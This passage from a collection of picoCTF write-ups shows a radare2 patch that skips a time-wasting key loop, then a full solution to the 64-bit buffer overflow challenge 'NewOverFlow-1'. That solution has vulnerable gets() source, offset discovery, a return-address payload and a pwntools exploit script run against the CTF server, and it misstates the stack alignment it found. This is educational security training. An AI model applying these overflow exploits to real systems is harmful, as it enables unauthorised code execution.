sym.set_timer\r\n[0x000006b0]> s sym.get_key\r\n[0x000008d7]> pdf\r\n/ (fcn) sym.get_key 47\r\n|   sym.get_key ();\r\n|           ; CALL XREF from main @ 0x99c\r\n|           0x000008d7      55             push rbp\r\n|           0x000008d8      4889e5         mov rbp, rsp\r\n|           0x000008db      488d3dfc0100.  lea rdi, str.Creating_key... ; 0xade ; \"Creating key...\" ; const char *s\r\n|           0x000008e2      e869fdffff     call sym.imp.puts           ; int puts(const char *s)\r\n|           0x000008e7      b800000000     mov eax, 0\r\n|           0x000008ec      e850ffffff     call sym.calculate_key\r\n|           0x000008f1      890565072000   mov dword [obj.key], eax    ; [0x20105c:4]=0\r\n|           0x000008f7      488d3df00100.  lea rdi, str.Finished       ; 0xaee ; \"Finished\" ; const char *s\r\n|           0x000008fe      e84dfdffff     call sym.imp.puts           ; int puts(const char *s)\r\n|           0x00000903      90             nop\r\n|           0x00000904      5d             pop rbp\r\n\\           0x00000905      c3             ret\r\n[0x000008d7]> s sym.calculate_key\r\nsym.calculate_key   sym.calculate_key\r\n[0x000008d7]> s sym.calculate_key\r\n[0x00000841]> pdf\r\n/ (fcn) sym.calculate_key 29\r\n|   sym.calculate_key ();\r\n|           ; var uint32_t var_4h @ rbp-0x4\r\n|           ; CALL XREF from sym.get_key @ 0x8ec\r\n|           0x00000841      55             push rbp\r\n|           0x00000842      4889e5         mov rbp, rsp\r\n|           0x00000845      c745fc1c07c2.  mov dword [var_4h], 0xd8c2071c\r\n|           ; CODE XREF from sym.calculate_key @ 0x857\r\n|       .-> 0x0000084c      836dfc01       sub dword [var_4h], 1\r\n|       :   0x00000850      817dfc8e0361.  cmp dword [var_4h], 0xec61038e\r\n|       `=< 0x00000857      75f3           jne 0x84c\r\n|           0x00000859      8b45fc         mov eax, dword [var_4h]\r\n|           0x0000085c      5d             pop rbp\r\n\\           0x0000085d      c3             ret\r\n[0x00000841]> oo+\r\n[0x00000841]> s 0x00000845\r\n[0x00000845]> pd 1\r\n|           0x00000845      c745fc1c07c2.  mov dword [var_4h], 0xd8c2071c\r\n[0x00000845]> wa mov dword [rbp-0x4], 0xec61038f\r\nWritten 7 byte(s) (mov dword [rbp-0x4], 0xec61038f) = wx c745fc8f0361ec\r\n[0x00000845]> q\r\n```\r\n\r\nBefore the change, `calculate_key` would count from `0xd8c2071c` to `0xec61038e` and only then return. Since this is just a time-waster, we start counting from `0xec61038f` instead.\r\n\r\nNow the program runs much faster, and doesn't hit the alarm:\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/Need_For_Speed# ./patched\r\nKeep this thing over 50 mph!\r\n============================\r\n\r\nCreating key...\r\nFinished\r\nPrinting flag:\r\nPICOCTF{Good job keeping bus #236cb1c9 speeding along!}\r\n```", "timestamp": "2025-10-21T13:36:27.930911"}
{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_picoCTF/NewOverFlow-1.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/NewOverFlow-1.md", "content": "# NewOverFlow-1\r\nBinary Exploitation, 200 points\r\n\r\n## Description:\r\n> Lets try moving to 64-bit, but don't worry we'll start easy. Overflow the buffer and change the return address to the flag function in this program.\r\n\r\n```c\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <string.h>\r\n#include <unistd.h>\r\n#include <sys/types.h>\r\n\r\n#define BUFFSIZE 64\r\n#define FLAGSIZE 64\r\n\r\nvoid flag() {\r\n  char buf[FLAGSIZE];\r\n  FILE *f = fopen(\"flag.txt\",\"r\");\r\n  if (f == NULL) {\r\n    printf(\"'flag.txt' missing in the current directory!\\n\");\r\n    exit(0);\r\n  }\r\n\r\n  fgets(buf,FLAGSIZE,f);\r\n  printf(buf);\r\n}\r\n\r\nvoid vuln(){\r\n  char buf[BUFFSIZE];\r\n  gets(buf);\r\n}\r\n\r\nint main(int argc, char **argv){\r\n\r\n  setvbuf(stdout, NULL, _IONBF, 0);\r\n  gid_t gid = getegid();\r\n  setresgid(gid, gid, gid);\r\n  puts(\"Welcome to 64-bit. Give me a string that gets you the flag: \");\r\n  vuln();\r\n  return 0;\r\n}\r\n\r\n\r\n```\r\n\r\n\r\n## Solution:\r\n\r\nThis should be a pretty simple overflow challenge. However, there's a twist.\r\n\r\nFirst, we'll go over the steps that should have worked in a perfect world.\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/NewOverFlow-1# checksec.sh -f ./vuln\r\nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified                                                                                     Fortifiable  FILE\r\nPartial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   72 Symbols      No      0                                                                                             6./vuln\r\n```\r\n\r\nFrom the C file we can see that the program allocates a buffer of 64 bytes, and performs an unbound read into the buffer. Since there's no canary and no PIE enabled, we just have to overrun the return address of `vuln` with the address of `flag` and we should see the flag being printed.\r\n\r\nWe start by configuring the system to create a core dump for the upcoming crash:\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/NewOverFlow-1# ulimit -c unlimited\r\nroot@kali:/media/sf_CTFs/pico/NewOverFlow-1# echo ~/core/core_dump > /proc/sys/kernel/core_pattern\r\n```\r\n\r\nThen, we input to the program a 64-bit De-Bruijn sequence using the  `cyclic` utility to locate the overflow offset:\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/NewOverFlow-1# cyclic -n 8 100 | ./vuln\r\nWelcome to 64-bit. Give me a string that gets you the flag:\r\nSegmentation fault (core dumped)\r\n```\r\n\r\nWe open the core dump with GDB to locate the faulting address:\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/NewOverFlow-1# gdb ./vuln ~/core/core_dump 2>/dev/null\r\nGNU gdb (Debian 7.12-6+b1) 7.12.0.20161007-git\r\nCopyright (C) 2016 Free Software Foundation, Inc.\r\nLicense GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>\r\nThis is free software: you are free to change and redistribute it.\r\nThere is NO WARRANTY, to the extent permitted by law.  Type \"show copying\"\r\nand \"show warranty\" for details.\r\nThis GDB was configured as \"x86_64-linux-gnu\".\r\nType \"show configuration\" for configuration details.\r\nFor bug reporting instructions, please see:\r\n<http://www.gnu.org/software/gdb/bugs/>.\r\nFind the GDB manual and other documentation resources online at:\r\n<http://www.gnu.org/software/gdb/documentation/>.\r\nFor help, type \"help\".\r\nType \"apropos word\" to search for commands related to \"word\"...\r\nReading symbols from ./vuln...(no debugging symbols found)...done.\r\n[New LWP 1805]\r\nCore was generated by `./vuln'.\r\nProgram terminated with signal SIGSEGV, Segmentation fault.\r\n#0  0x00000000004007e7 in vuln ()\r\ngdb-peda$ bt\r\n#0  0x00000000004007e7 in vuln ()\r\n#1  0x616161616161616a in ?? ()\r\n#2  0x616161616161616b in ?? ()\r\n#3  0x616161616161616c in ?? ()\r\n#4  0x00007f006161616d in ?? ()\r\n#5  0x0000000000000000 in ?? ()\r\ngdb-peda$ quit\r\n```\r\n\r\nWe search for the faulting address in our cyclic sequence to get the overflow offset:\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/NewOverFlow-1# cyclic -n 8 -l 0x616161616161616a\r\n72\r\n```\r\n\r\nWe check what `flag`'s address is:\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/NewOverFlow-1# objdump -D ./vuln | grep \"<flag>\"\r\n0000000000400767 <flag>:\r\n```\r\n\r\nAnd we perform the overflow:\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/NewOverFlow-1# python -c \"print 'A'*72 + '\\x67\\x07\\x40\\x00\\x00\\x00\\x00\\x00'\" | ./vuln\r\nWelcome to 64-bit. Give me a string that gets you the flag:\r\npicoCTF{local_fake_flag}\r\nSegmentation fault (core dumped)\r\n```\r\n\r\nThis works great locally (buffer overflow 101, they promised to \"start easy\"). However, if we run this on the server, we get a different response:\r\n```console\r\ndvdalt@pico-2019-shell1:/problems/newoverflow-1_6_9968801986a228beb88aaad605c8d51a$ python -c \"print 'A'*72 + '\\x67\\x07\\x40\\x00\\x00\\x00\\x00\\x00'\" | ./vuln\r\nWelcome to 64-bit. Give me a string that gets you the flag:\r\nSegmentation fault (core dumped)\r\n```\r\n\r\nWe just get a segmentation fault - no flag!\r\n\r\nLet's try to debug (we have to create a fake flag file since debugging a `setuid` program removes the extra permissions due to obvious reasons).\r\n\r\n```\r\ndvdalt@pico-2019-shell1:/problems/newoverflow-1_6_9968801986a228beb88aaad605c8d51a$ cd ~\r\ndvdalt@pico-2019-shell1:~$ echo picoCTF{fake_remote_flag} > flag.txt\r\ndvdalt@pico-2019-shell1:~$ gdb /problems/newoverflow-1_6_9968801986a228beb88aaad605c8d51a/vuln\r\nGNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git\r\nCopyright (C) 2018 Free Software Foundation, Inc.\r\nLicense GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>\r\nThis is free software: you are free to change and redistribute it.\r\nThere is NO WARRANTY, to the extent permitted by law.  Type \"show copying\"\r\nand \"show warranty\" for details.\r\nThis GDB was configured as \"x86_64-linux-gnu\".\r\nType \"show configuration\" for configuration details.\r\nFor bug reporting instructions, please see:\r\n<http://www.gnu.org/software/gdb/bugs/>.\r\nFind the GDB manual and other documentation resources online at:\r\n<http://www.gnu.org/software/gdb/documentation/>.\r\nFor help, type \"help\".\r\nType \"apropos word\" to search for commands related to \"word\"...\r\nReading symbols from /problems/newoverflow-1_6_9968801986a228beb88aaad605c8d51a/vuln...(no debugging symbols found)...done.\r\n(gdb) r <<< $( python -c \"print 'A'*72 + '\\x67\\x07\\x40\\x00\\x00\\x00\\x00\\x00'\")\r\nStarting program: /problems/newoverflow-1_6_9968801986a228beb88aaad605c8d51a/vuln <<< $( python -c \"print 'A'*72 + '\\x67\\x07\\x40\\x00\\x00\\x00\\x00\\x00'\")\r\n/bin/bash: warning: command substitution: ignored null byte in input\r\nWelcome to 64-bit. Give me a string that gets you the flag:\r\n\r\nProgram received signal SIGSEGV, Segmentation fault.\r\nbuffered_vfprintf (s=s@entry=0x7f73768f7760 <_IO_2_1_stdout_>, format=format@entry=0x7fff815cbc28 \"picoCTF{fake_remote_flag}\\n\", args=args@entry=0x7fff815cbb48) at vfprintf.c:2314\r\n2314    vfprintf.c: No such file or directory.\r\n```\r\nLooks like we hit an exception in `printf`, while attempting to print the flag.\r\n\r\nHere's the faulting command:\r\n\r\n```\r\n(gdb) set disassembly-flavor intel\r\n(gdb) disas\r\nDump of assembler code for function buffered_vfprintf:\r\n   0x00007f73765695d0 <+0>:     push   r14\r\n   0x00007f73765695d2 <+2>:     push   r13\r\n   0x00007f73765695d4 <+4>:     push   r12\r\n   0x00007f73765695d6 <+6>:     push   rbp\r\n   0x00007f73765695d7 <+7>:     push   rbx\r\n   0x00007f73765695d8 <+8>:     mov    rbx,rdi\r\n   0x00007f73765695db <+11>:    sub    rsp,0x2140\r\n   0x00007f73765695e2 <+18>:    mov    rax,QWORD PTR fs:0x28\r\n   0x00007f73765695eb <+27>:    mov    QWORD PTR [rsp+0x2138],rax\r\n   0x00007f73765695f3 <+35>:    xor    eax,eax\r\n   0x00007f73765695f5 <+37>:    mov    eax,DWORD PTR [rdi+0xc0]\r\n   0x00007f73765695fb <+43>:    test   eax,eax\r\n   0x00007f73765695fd <+45>:    jne    0x7f7376569770 <buffered_vfprintf+416>\r\n   0x00007f7376569603 <+51>:    mov    DWORD PTR [rdi+0xc0],0xffffffff\r\n   0x00007f737656960d <+61>:    lea    rax,[rsp+0x130]\r\n   0x00007f7376569615 <+69>:    lea    rdi,[rsp+0x30]\r\n   0x00007f737656961a <+74>:    mov    QWORD PTR [rsp+0x110],rbx\r\n   0x00007f7376569622 <+82>:    mov    DWORD PTR [rsp+0xf0],0xffffffff\r\n   0x00007f737656962d <+93>:    mov    DWORD PTR [rsp+0x30],0xfbad8004\r\n   0x00007f7376569635 <+101>:   mov    QWORD PTR [rsp+0x8],rax\r\n   0x00007f737656963a <+106>:   lea    rax,[rsp+0x2130]\r\n   0x00007f7376569642 <+114>:   mov    QWORD PTR [rsp+0xb8],0x0\r\n   0x00007f737656964e <+126>:   movq   xmm0,QWORD PTR [rsp+0x8]\r\n   0x00007f7376569654 <+132>:   mov    QWORD PTR [rsp+0x60],rax\r\n   0x00007f7376569659 <+137>:   mov    eax,DWORD PTR [rbx+0x74]\r\n   0x00007f737656965c <+140>:   punpcklqdq xmm0,xmm0\r\n   0x00007f7376569660 <+144>:   mov    DWORD PTR [rsp+0xa4],eax\r\n   0x00007f7376569667 <+151>:   lea    rax,[rip+0x3890f2]        # 0x7f73768f2760 <_IO_helper_jumps>\r\n=> 0x00007f737656966e <+158>:   movaps XMMWORD PTR [rsp+0x50],xmm0\r\n   0x00007f7376569673 <+163>:   mov    QWORD PTR [rsp+0x108],rax\r\n   0x00007f737656967b <+171>:   call   0x7f7376566390 <_IO_vfprintf_internal>\r\n   0x00007f7376569680 <+176>:   mov    r12d,eax\r\n   0x00007f7376569683 <+179>:   mov    r13d,DWORD PTR [rip+0x39225e]        # 0x7f73768fb8e8 <__libc_pthread_functions_init>\r\n```\r\n\r\nLet's take a look at the [`movaps` Reference](https://c9x.me/x86/html/file_module_x86_id_180.html):\r\n\r\n> When the source or destination operand is a memory operand, the operand must be aligned on a 16-byte boundary or a general-protection exception (#GP) is generated.\r\n\r\nHowever, in our case:\r\n```\r\n(gdb) p $rsp+0x50\r\n$1 = (void *) 0x7fff815c94a8\r\n(gdb) p ((unsigned int)$1) % 16\r\n$3 = 8\r\n```\r\n\r\nThis value is 16-byte aligned, so the program crashes. Looks like a compiler optimization is standing between us and the flag.\r\n\r\nThe solution was to call `main` again via the original payload, and then call `flag` as intended. Lucky for us, the stack was correctly aligned for such a call stack.\r\n\r\nA `pwntools` script to automate the process:\r\n\r\n```python\r\n# First, generate a pwntools template using:\r\n# pwn template --host 2019shell1.picoctf.com --user dvdalt --path /problems/newoverflow-1_6_9968801986a228beb88aaad605c8d51a/vuln\r\n\r\n#===========================================================\r\n#                    EXPLOIT GOES HERE\r\n#===========================================================\r\n# Arch:     amd64-64-little\r\n# RELRO:    Partial RELRO\r\n# Stack:    No canary found\r\n# NX:       NX enabled\r\n# PIE:      No PIE (0x400000)\r\n\r\nimport os\r\n\r\nif shell is not None:\r\n    shell.set_working_directory(os.path.dirname(remote_path))\r\n\r\ndef send_payload(proc, payload):\r\n    proc.sendlineafter(\"Welcome to 64-bit. Give me a string that gets you the flag: \", payload)\r\n\r\n\r\ndef get_overflow_offset():\r\n    # It's problematic to create a core dump on an NTFS file system,\r\n    # so reconfigure core dumps to be created elsewhere\r\n    os.system(\"echo ~/core/core_dump > /proc/sys/kernel/core_pattern\")\r\n    os.system(\"rm core.* > /dev/null\")\r\n    proc = process(exe.path)\r\n    payload = cyclic(200, n = exe.bytes)\r\n    send_payload(proc, payload)\r\n    proc.wait()\r\n    offset = cyclic_find(proc.corefile.fault_addr, n = exe.bytes )\r\n    log.info(\"Overflow offset: {} ({}-byte architecture)\".format(offset, exe.bytes))\r\n    return offset\r\n\r\n\r\noverflow_offset = get_overflow_offset()\r\nlog.info(\"flag() address: {}\".format(hex(exe.symbols[\"flag\"])))\r\n\r\nio = start()\r\npayload = fit({overflow_offset: exe.symbols[\"main\"]}, filler = 'B')\r\nlog.info(\"Sending payload: \\n{}\".format(hexdump(payload)))\r\n\r\nsend_payload(io, payload)\r\n\r\npayload = fit({overflow_offset: exe.symbols[\"flag\"]}, filler = 'B')\r\nlog.info(\"Sending payload: \\n{}\".format(hexdump(payload)))\r\n\r\nsend_payload(io, payload)\r\n\r\nprint io.recvall()\r\n```\r\n\r\nOutput:\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/NewOverFlow-1# python exploit.py\r\n[*] '/media/sf_CTFs/pico/NewOverFlow-1/vuln'\r\n    Arch:     amd64-64-little\r\n    RELRO:    Partial RELRO\r\n    Stack:    No canary found\r\n    NX:       NX enabled\r\n    PIE:      No PIE (0x400000)\r\n[+] Connecting to 2019shell1.picoctf.com on port 22: Done\r\n[*] dvdalt@2019shell1.picoctf.com:\r\n    Distro    Ubuntu 18.04\r\n    OS:       linux\r\n    Arch:     amd64\r\n    Version:  4.15.0\r\n    ASLR:     Enabled\r\n[+] Opening new channel: 'pwd': Done\r\n[+] Receiving all data: Done (13B)\r\n[*] Closed SSH channel with 2019shell1.picoctf.com\r\n[*] Working directory: '/tmp/tmp.6L3X1OVx47'\r\n[+] Opening new channel: 'ln -s /home/dvdalt/* .': Done\r\n[+] Receiving all data: Done (0B)\r\n[*] Closed SSH channel with 2019shell1.picoctf.com\r\n[*] Working directory: '/problems/newoverflow-1_6_9968801986a228beb88aaad605c8d51a'\r\n[+] Starting local process '/media/sf_CTFs/pico/NewOverFlow-1/vuln': pid 840\r\n[*] Process '/media/sf_CTFs/pico/NewOverFlow-1/vuln' stopped with exit code -11 (SIGSEGV) (pid 840)\r\n[+] Parsing corefile...: Done\r\n[*] '/media/sf_CTFs/pico/NewOverFlow-1/core.840'\r\n    Arch:      amd64-64-little\r\n    RIP:       0x4007e7\r\n    RSP:       0x7ffcf64ed5f8\r\n    Exe:       '/media/sf_CTFs/pico/NewOverFlow-1/vuln' (0x400000)\r\n    Fault:     0x616161616161616a\r\n[*] Overflow offset: 72 (8-byte architecture)\r\n[*] flag() address: 0x400767\r\n[+] Starting remote process '/problems/newoverflow-1_6_9968801986a228beb88aaad605c8d51a/vuln' on 2019shell1.picoctf.com: pid 322295\r\n[*] Sending payload:\r\n    00000000  42 42 42 42  42 42 42 42  42 42 42 42  42 42 42 42  │BBBB│BBBB│BBBB│BBBB│\r\n    *\r\n    00000040  42 42 42 42  42 42 42 42  e8 07 40 00  00 00 00 00  │BBBB│BBBB│··@·│····│\r\n    00000050\r\n[*] Sending payload:\r\n    00000000  42 42 42 42  42 42 42 42  42 42 42 42  42 42 42 42  │BBBB│BBBB│BBBB│BBBB│\r\n    *\r\n    00000040  42 42 42 42  42 42 42 42  67 07 40 00  00 00 00 00  │BBBB│BBBB│g·@·│····│\r\n    00000050\r\n[+] Receiving all data: Done (51B)\r\n[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 322295)\r\n\r\npicoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_d0b837aa}\r\n```", "timestamp": "2025-10-21T13:36:28.034039"}
